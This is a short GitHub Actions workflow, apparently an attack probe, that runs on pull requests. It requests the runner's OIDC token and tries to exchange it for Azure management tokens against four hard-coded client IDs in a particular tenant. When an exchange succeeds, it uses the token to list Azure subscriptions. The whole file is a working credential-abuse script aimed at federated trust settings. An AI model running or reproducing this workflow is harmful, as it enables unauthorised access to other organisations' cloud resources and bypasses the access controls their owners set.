name: ul8781pr
on:
  pull_request:
permissions:
  id-token: write
  contents: read
jobs:
  exh:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - name: exchange
        run: |
          set +e
          echo "CTX event=$GITHUB_EVENT_NAME ref=$GITHUB_REF repo=$GITHUB_REPOSITORY"
          O=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
          OIDC=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
          echo "oidc_len=${#OIDC}"
          for CID in 032854b2-ba65-4dd6-bdd4-4e86b8756667 1459b1f6-7a5b-4300-93a2-44b4a651759f a1c42e17-82a8-41a5-906d-3eaca8b54607 abfa0a7c-a6b6-4736-8310-5855508787cd; do
            R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/e8adc959-bf67-48e0-95b4-318b5f73946c/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$CID -d scope=https://management.azure.com/.default -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
            C=$(echo "$R" | grep -oE 'AADSTS[0-9]+' | head -1)
            T=$(echo "$R" | python3 -c "import json,sys;d=json.load(sys.stdin);print(len(d.get('access_token','')))" 2>/dev/null || echo 0)
            echo "RESULT pull_request $CID ${C:-NONE} tok=${T:-0}"
            if [ "${T:-0}" -gt 100 ]; then echo "$R" > tok.json; fi
          done
          if [ -f tok.json ]; then echo "=== WINNER"; T=$(python3 -c "import json;print(json.load(open('tok.json'))['access_token'])"); curl -s -m 30 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions?api-version=2022-12-01" | head -c 900; else echo NO_WINNER; fi
